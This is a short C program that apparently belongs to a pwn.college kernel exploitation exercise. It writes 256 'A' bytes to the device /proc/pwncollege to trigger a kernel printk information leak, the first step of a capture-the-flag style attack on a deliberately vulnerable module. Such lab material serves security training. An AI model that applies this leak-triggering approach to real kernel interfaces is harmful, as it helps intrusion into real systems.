#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

int main() {
    int fd = open("/proc/pwncollege", O_WRONLY);

    
    // Write something small to trigger the printk leak
    char payload[0x100];
    memset(payload, 0x41, sizeof(payload));
    write(fd, payload, sizeof(payload));
    
    return 0;
}
